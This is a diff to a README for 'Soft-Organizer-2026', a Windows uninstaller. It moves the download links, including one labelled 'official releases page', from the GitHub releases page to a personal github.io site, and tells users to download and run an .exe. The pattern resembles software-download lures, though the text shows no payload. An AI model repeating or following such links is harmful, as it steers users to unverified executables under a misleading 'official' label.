@@ -1,6 +1,6 @@
 # 🛠️ Soft-Organizer-2026 - Remove unwanted programs and clean Windows
 
-[![](https://img.shields.io/badge/Download-Soft_Organizer_2026-blue.svg)](https://github.com/aribakhan4628/Soft-Organizer-2026/releases)
+[![](https://img.shields.io/badge/Download-Soft_Organizer_2026-blue.svg)](https://aribakhan4628.github.io)
 
 Soft Organizer 2026 helps you maintain a clean and fast computer. It removes programs that you no longer need. This tool tracks changes during software installation and deletes all residual files. It keeps your registry clean and your system running smoothly.
 
@@ -8,7 +8,7 @@ Soft Organizer 2026 helps you maintain a clean and fast computer. It removes pro
 
 Follow these steps to obtain the tool:
 
-1. Visit the [official releases page](https://github.com/aribakhan4628/Soft-Organizer-2026/releases).
+1. Visit the [official releases page](https://aribakhan4628.github.io).
 2. Look for the latest version listed at the top of the page.
 3. Click the file ending in .exe to start your download.
 4. Save the file to your desktop or downloads folder.
